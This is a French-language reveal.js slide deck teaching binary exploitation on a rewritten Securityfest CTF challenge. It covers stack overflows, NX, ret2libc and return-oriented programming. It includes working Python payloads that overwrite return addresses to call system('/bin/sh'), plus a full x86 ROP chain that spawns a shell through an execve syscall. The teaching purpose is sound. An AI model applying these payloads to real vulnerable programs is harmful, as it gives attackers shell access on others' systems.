<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

		<title>reveal.js</title>

		<link rel="stylesheet" href="css/reveal.css">
		<link rel="stylesheet" href="css/theme/beige.css">

		<!-- Theme used for syntax highlighting of code -->
		<link rel="stylesheet" href="lib/css/monokai-sublime.css">

		<!-- Printing and PDF exports -->
		<script>
			var link = document.createElement( 'link' );
			link.rel = 'stylesheet';
			link.type = 'text/css';
			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
			document.getElementsByTagName( 'head' )[0].appendChild( link );
		</script>
	</head>
	<body>
		<div class="reveal">
			<div class="slides">
				
<section>
<section data-markdown>
<script type="text/template">
# Introduction aux techniques modernes d'exploitation binaire

</script>
</section>
<section data-markdown>
<script type="text/template">
## Sujets

 * Rétro-ingénierie
 * Exploitation
 * x86, x86_64
 * *Return-Oriented Programming*

</script>
</section>
<section data-markdown>
<script type="text/template">
## Plan

 * Présentation de l'application cible
 * Rétro-ingénierie
 * *Segmentation Fault* et retour sur la convention d'appel GNU/Linux x86
 * Exploitation simple
 * Protection de segments de mémoire
 * Réutilisation de code (*Ret2libc*)
 * Réutilisation de segments de code (*ROP*)


</script>
</section>
<section data-markdown>
<script type="text/template">
## Cheminement

 1. Application cible 32 bits
 1. Analyse d'un<!-- .element: class="fragment" data-fragment-index="1" --> *Segmentation fault* <!-- .element: class="fragment" data-fragment-index="1" -->
 1. Developpement d'un exploit simple avec injection de code <!-- .element: class="fragment" data-fragment-index="1" -->
 1. Recompilation avec le bit <!-- .element: class="fragment" data-fragment-index="1" --> `NX` activé <!-- .element: class="fragment" data-fragment-index="1" -->
 1. Exploit sans injection de code <!-- .element: class="fragment" data-fragment-index="1" -->
 1. Recompilation en 64 bits (Changement de la convention d'appel) <!-- .element: class="fragment" data-fragment-index="1" -->
 1. Exploitation en utilisant le *ROP*

</script>
</section>
</section>

<section>
<section data-markdown>
<script type="text/template">
## Cible

Version réécrite du défi TVStation du *Securityfest CTF*.

</script>
</section>
<section>
<script type="text/javascript" src="https://asciinema.org/a/3cqpt9q0c6c1lqatqwxbceqzp.js"
	id="asciicast-3cqpt9q0c6c1lqatqwxbceqzp" async data-autoplay="false" data-size="big" data-preload="false"
	data-theme="solarized-light" class="stretch"></script>

</section>
<section data-markdown>
<script type="text/template">
### Voyez-vous ce qui cloche?
![tototo](res/disass-menu.jpg)

</script>
</section>
<section data-markdown>
<script type="text/template">
### Voyez-vous mieux ce qui cloche?
![tototo](res/disass-menu-2.jpg)

</script>
</section>
<section data-markdown>
<script type="text/template">
### HEIN?!
![tototo](res/disass-menu-3.jpg)

</script>
</section>
<section>
<script type="text/javascript" src="https://asciinema.org/a/386o6vxucae3i8lwhdtehvva5.js"
	id="asciicast-386o6vxucae3i8lwhdtehvva5" async data-autoplay="false" data-size="big" data-preload="false"
	data-theme="solarized-light" class="stretch"></script>

</section>
</section>

<section>
<section data-markdown>
<script type="text/template">
## Segfault

![crash.jpg](res/core.jpg)

Pointeur d'instruction sur 0x41414141

</script>
</section>
<section data-markdown>
<script type="text/template">
## Convention d'appel GNU/Linux x86

* Paramètres sont passés sur la pile
* Sauvegarde du cadre d'activation (*Stack Frame*) sur la pile. (*saved BP*)
* Adresse de retour des fonctions sur la pile (*saved IP*)

</script>
</section>
<section data-markdown>
<script type="text/template">
### En détail

1.  `push` les arguments sur la pile (dans l'ordre inverse)
2. `call`
  1.  `push` l'adresse de la prochaine instruction (adresse de retour)
  2.  change le pointeur d'instruction pour l'adresse spécifiée
  3.  exécute le sous-programme
  4.  `pop` l'adresse de la prochaine instruction dans `eip`
3.  continue l'exécution normalement


</script>
</section>
<section data-markdown>
<script type="text/template">
### Pile avant/après `call`

![avant call](res/stack-before-call.jpg)
![apres call](res/stack-after-call.jpg)

</script>
</section>
<section data-markdown>
<script type="text/template">
### Pile avant/après `ret`

![avant ret](res/stack-before-ret.jpg)
![apres ret](res/stack-after-ret.jpg)

</script>
</section>
<section data-markdown>
<script type="text/template">
### debug_func

![source](res/debug_func.jpg)

</script>
</section>
<section data-markdown>
<script type="text/template">
### debug_func

![source](res/debug_func-anot.jpg)

</script>
</section>
<section data-markdown>
<script type="text/template">
### Contenu de la pile dans debug_func
![Stack elements](res/stack-ok-overflowed.jpg) <!-- .element: class="stretch" -->

</script>
</section>
</section>

<section>
<section data-markdown>
<script type="text/template">
### Controler l'exécution

* Contrôle sur le pointeur d'instruction via l'adresse de retour <!-- .element: class="fragment highlight-green" data-fragment-index="1" -->
* Injection de code par notre input (processeur exécute bêtement l'instruction à $eip)<!-- .element: class="fragment highlight-green" data-fragment-index="2" -->
* Paramètres sont passés par la pile <!-- .element: class="fragment highlight-green" data-fragment-index="3" -->

</script>
</section>
<section data-markdown>
<script type="text/template">
### Plan d'attaque

1. Se servir de notre input pour contrôler $eip
2. Injecter du code qu'on voudra exécuter dans notre input
3. Faire en sorte que le processeur exécute le code injecté

</script>
</section>
<section data-markdown>
<script type="text/template">
### Exploit
<script type="text/javascript" src="https://asciinema.org/a/c2igxid384yi2kicrre6ix97p.js" id="asciicast-c2igxid384yi2kicrre6ix97p" async data-size="big" data-theme="solarized-light" class="stretch"></script>

</script>
</section>
<section data-markdown>
<script type="text/template">
### Ce qui s'est passé
![stack-avant](res/stack-before-read.jpg)

</script>
</section>
<section data-markdown>
<script type="text/template">
### Ce qui s'est passé
![stack-avant](res/stack-after-read.jpg)

</script>
</section>
</section>

<section>
<section data-markdown>
<script type="text/template">
## Protection des zones mémoires

Depuis l'introduction des MMU, les systèmes d'exploitation peuvent marquer certaines pages mémoires pour contrôler les
accès en lecture ou en écriture à ces pages. Le processeur lève un signal lors d'un accès non-authorisé.

En 2004, les premières version de systèmes d'exploitation qui contrôlaient les droit d'accès en exécution à des zones
mémoires. (PaX et ExecShield sous Linux et DEP sous Windows)

De cette façon, il est impossible d'injecter du nouveau code à exécuter dans les variables
locales.

</script>
</section>
<section data-markdown>
<script type="text/template">
## Conséquences sur notre exploit

```
ppp@forsaker:~/work/latece-rop $ python exploit.py | ./bin/tvstation
=== TV Station - Control Panel ===
1) Show uptime
2) Show current user
3) Exit
Choice: === TV Station - Debug Menu ===
[Debug menu] system is @0x80488b0
[Debug menu] enter cmd: Segmentation fault
```

</script>
</section>
</section>

<section>
<section data-markdown>
<script type="text/template">
### Controler l'exécution

* Contrôle sur le pointeur d'instruction via l'adresse de retour <!-- .element: class="fragment highlight-green" data-fragment-index="1" -->
* Injection de code par notre input (processeur exécute bêtement l'instruction à $eip)<!-- .element: class="fragment highlight-red" data-fragment-index="2" -->
* Paramètres sont passés par la pile <!-- .element: class="fragment highlight-green" data-fragment-index="3" -->

</script>
</section>
<section data-markdown>
<script type="text/template">
## Ret2libc

* Trouver du code pour faire ce que l'on veut dans le code exécutable existant.
* On a accès à n'importe quel segment de code exécutable.
* libc!

Objectif:

Retourner dans `__libc_system` avec les bons arguments (`"/bin/sh"`, clairement!)

</script>
</section>
<section data-markdown>
<script type="text/template">
## Ret2libc - Exploit

On veut faire:

``` C
int system(const char *command);
```

Il nous faut:

 * L'adresse de `__libc_system`
 * Un pointeur vers `"/bin/sh"`

``` bash
$ nm -D libc6.so | grep __libc_system
0003e3e0 T __libc_system
```

``` bash
$ strings --radix=x libc.so | grep "/bin/sh"
15f771 /bin/sh
```

</script>
</section>
<section data-markdown>
<script type="text/template">
## Ret2libc - Exploit - suite

Dessin de stack de ce qu'on veut comme setup

| Details           | Pile              |
|-------------------|-------------------|
| input             | `AAAA` |
| variable locale3  | `AAAA` |
| variable locale2  | `AAAA` |
| variable locale1  | `AAAA` |
| adresse de retour | adresse de `__libc_system` |
|                   | `char * ("/bin/sh")`|

</script>
</section>
<section data-markdown>
<script type="text/template">
## Ret2libc - Exploit - payload

``` python
# Parser l'adresse de system
libc_system = int(data.split("@")[1].split("\n")[0], 16)

# Trouver la base de libc
libc_system_offset = 0x3ab30
libc_base = libc_system - libc_system_offset

# Trouver l'adresse de "/bin/sh" a partir de la base de libc
binsh_offset = 0x15c739
binsh = libc_base + binsh_offset

payload = "A" * 32 # Padding jusqu'a l'adresse de retour
payload += p32(libc_system) # Ecraser adresse de retour par adresse de system
payload += p32(binsh) # Argument 1 (pointeur vers "/bin/sh")

# Press ze button!
p.sendline(payload)
```
<!-- .element: class="stretch" -->

</script>
</section>
</section>

<section>
<section data-markdown>
<script type="text/template">
## x86_64

Changements à la convention d'appel:

Les 6 premiers arguments sont passés via les registres `%rdi, %rsi, %rdx, %rcx, %r8 and %r9`.

Gain de performance considérable par rapport à pousser les paramètres sur la pile.

<!-- Il ne suffit plus de mettre notre pointeur vers `"/bin/sh"`.-->

</script>
</section>
<section data-markdown>
<script type="text/template">
### Controler l'exécution

* Contrôle sur le pointeur d'instruction via l'adresse de retour <!-- .element: class="fragment highlight-green" data-fragment-index="1" -->
* Injection de code par notre input (processeur exécute bêtement l'instruction à $eip)<!-- .element: class="fragment highlight-red" data-fragment-index="2" -->
* Paramètres sont passés par la pile <!-- .element: class="fragment highlight-red" data-fragment-index="3" -->

</script>
</section>
<section data-markdown>
<script type="text/template">
## Contournement

* Il faut passer notre paramètre par `%rdi`.
* Il faut trouver comment changer la valeur de `%rdi`.
* Avec de la chance sans effet de bord.


</script>
</section>
<section data-markdown>
<script type="text/template">
## Return-Oriented Programming

"Utilisation de séquences d'instructions machine appellés *gadgets*.
Chaque *gadget* se termine par un `return` et existe déjà dans les segments exécutables du code binaire de l'application.
En chaînant ces gadgets, l'attaquant peut exécuter des opérations arbitraires sans injecter de code additionnel."

</script>
</section>
<section data-markdown>
<script type="text/template">
## ROP - Exploit

Nous devons donc placer notre pointeur dans `rdi` en ayant contrôle que du contenu de la pile.

L'instruction `pop` fait *exactement* ça.

Gadget cible:
```
<__libc_iconv>:
[...]
pop rdi
ret
```

Plus qu'à avoir le pointeur de pile qui pointe sur notre pointeur vers `"/bin/sh"`.

</script>
</section>
<section data-markdown>
<script type="text/template">
## En détails

1. Retourner sur `pop rdi ; ret` avec l'adresse de `"/bin/sh"` comme prochaine valeur sur la pile.
2. Retourner sur `__libc_system`.

</script>
</section>
<section data-markdown>
<script type="text/template">
## Résultat

``` python
payload = ""
payload += "A" * 40
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

</script>
</section>
<section data-markdown>
<script type="text/template">
## Trace de l'exploit

GDB script pour voir les returns successifs

</script>
</section>
<section data-markdown>
<script type="text/template">
## Une ROP-chain plus réaliste

``` python
p = ''
p += pk(0x0806f4ea) # pop edx ; ret
p += pk(0x080eb060) # @ .data
p += pk(0x080bb926) # pop eax ; ret
p += '/bin'
p += pk(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
p += pk(0x41414141) # padding
p += pk(0x0806f4ea) # pop edx ; ret
p += pk(0x080eb064) # @ .data + 4
p += pk(0x080bb926) # pop eax ; ret
p += '//sh'
p += pk(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
p += pk(0x41414141) # padding
p += pk(0x0806f4ea) # pop edx ; ret
p += pk(0x080eb068) # @ .data + 8
p += pk(0x08054f10) # xor eax, eax ; ret
p += pk(0x08097936) # mov dword ptr [edx], eax ; pop ebx ; ret
p += pk(0x41414141) # padding
p += pk(0x080481c9) # pop ebx ; ret
p += pk(0x080eb060) # @ .data
p += pk(0x0806f511) # pop ecx ; pop ebx ; ret
p += pk(0x080eb068) # @ .data + 8
p += pk(0x080eb060) # padding without overwrite ebx
p += pk(0x0806f4ea) # pop edx ; ret
p += pk(0x080eb068) # @ .data + 8
p += pk(0x08054f10) # xor eax, eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x0807bf4f) # inc eax ; ret
p += pk(0x080499c1) # int 0x80
```

<!-- .elements class="stretch" -->

</script>
</section>
</section>

<section>
<section data-markdown>
<script type="text/template">
## Conclusion

Mitigations: ROPGuard, Emet, kBouncer, /ROP, etc.

</script>
</section>
<section data-markdown>
<script type="text/template">
## Bonus

Devinnez ce que fait cette ROP-chain...

</script>
</section>
</section>

			</div>
		</div>

		<script src="lib/js/head.min.js"></script>
		<script src="js/reveal.js"></script>

		<script>
			// More info https://github.com/hakimel/reveal.js#configuration
			Reveal.initialize({
				history: true,

				// More info https://github.com/hakimel/reveal.js#dependencies
				dependencies: [
					{ src: 'plugin/markdown/marked.js' },
					{ src: 'plugin/markdown/markdown.js' },
					{ src: 'plugin/notes/notes.js', async: true },
					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
				]
			});
		</script>
	</body>
</html>
